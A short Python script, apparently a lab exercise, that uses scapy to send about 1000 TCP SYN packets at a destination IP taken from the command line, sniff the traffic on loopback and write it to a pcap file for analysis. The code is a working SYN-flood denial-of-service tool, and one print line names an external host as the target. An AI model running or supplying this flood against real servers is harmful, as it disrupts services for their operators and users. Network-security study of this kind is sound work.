from scapy.all import *
import sys
import time
import os
import random
import netifaces

def SynFlooding(dest_ip="127.0.0.1",src_port=8010,target_port=8004,num_pkts_to_be_send=1000,delay=0.001):
    print("Initializing Sniffer....")
    sniffer=AsyncSniffer(
        iface="lo",
        filter=f"tcp and dst host {dest_ip} and port {target_port}",
        store=True
    )
    sniffer.start()
    time.sleep(1)

    print(f"Starting Syn flooding on: priyanshu23.pythonanywhere.com")
    packets=[]
    for i in range(num_pkts_to_be_send):
        src_ip = netifaces.ifaddresses("wlp1s0")[netifaces.AF_INET][0]['addr']
        seq=random.randint(0,4294967295)

        ip_pkt=IP(dst=dest_ip,src=src_ip)
        tcp_pkt=TCP(dport=target_port,sport=src_port,flags="S",seq=seq)

        pkt=ip_pkt/tcp_pkt
        packets.append(pkt)
        send(pkt,verbose=0)

        if (i+1)%100==0:
            print(f"{i+1} SYN packets send")

        time.sleep(delay)

    print("Finished SYN Flooding...")
    print("Stopping Sniffer")

    sniffer.stop()
    response=sniffer.results

    if response:
        print(f"Packets received: {len(response)}")
        response[0].summary()
        response[0].show()

        all_packets=response


    else:
        print("No response received from Server...")
        all_packets=packets


    print("Creating PCAP file...")
    print("Deleting previous pcap file..")

    if os.path.exists("analysis.pcap"):
        os.remove("analysis.pcap")


    wrpcap("analysis.pcap", all_packets)
    print("PCAP File created successfully...")


if __name__=="__main__":
    argv=sys.argv
    if len(argv)!=2:
        raise ValueError("Usage: sudo python3 syn_flooding.py destination_ip")

    dest_ip=argv[-1]
    SynFlooding(dest_ip)
